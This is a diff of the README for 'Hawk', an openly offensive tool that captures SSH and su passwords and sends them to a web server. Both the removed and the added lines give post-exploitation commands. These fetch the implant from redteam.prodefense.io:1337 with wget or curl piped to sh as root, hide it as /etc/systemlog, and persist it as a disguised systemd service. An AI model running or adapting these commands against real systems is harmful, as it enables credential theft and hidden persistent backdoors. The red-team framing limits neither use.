@@ -1,19 +1,19 @@
 # Hawk
 
-This tool monitors sshd for passwords being sent to the server.
+This tool monitors sshd and su for passwords.
 
 ## Description
 
-Hawk is a simple tool designed to monitor the sshd service for passwords being sent to the server. It includes a bash script for easy installation and a Go program for password exfiltration to a web server.
+Hawk is a simple tool designed to monitor the `sshd` and `su` services for passwords. Its written in Golang and exfiltrates the passwords to via HTTP GET request to a web server.
 
-## Building for server
+## Building for web server
 
 ```bash
 git clone https://github.com/MattKeeley/hawk.git &&
 cd hawk
 
 
-vim exfil.go and change the server location
+vim exfil.go and change the web server location
 
 
 go build -o hawk &&
@@ -24,14 +24,10 @@ cp hawk_backdoor /home/ubuntu/webserver
 ## Run once root is obtained:
 
 ```bash
- sudo ls /etc/systemlog || sudo wget http://redteam.prodefense.io:1337/hawk -O /etc/systemlog > /dev/null 2>&1
- sudo chmod +x /etc/systemlog
- sudo ls /etc/systemd/system/systemlog.service || sudo wget http://redteam.prodefense.io:1337/hawk_backdoor -O /etc/systemd/system/systemlog.service
- sudo systemctl start systemlog.service
- sudo systemctl enable systemlog.service
+nxc ssh -u "<user>" -p "<password>" --sudo-check -x 'echo "<password>" | sudo -S sh -c "$(curl -fsSL http://redteam.prodefense.io:1337/hawk.sh)"' "<target>"
 ```
 
-## For debugging to turn off
+## Turn off Hawk backdoor
 
 ```bash
  sudo systemctl stop systemlog.service
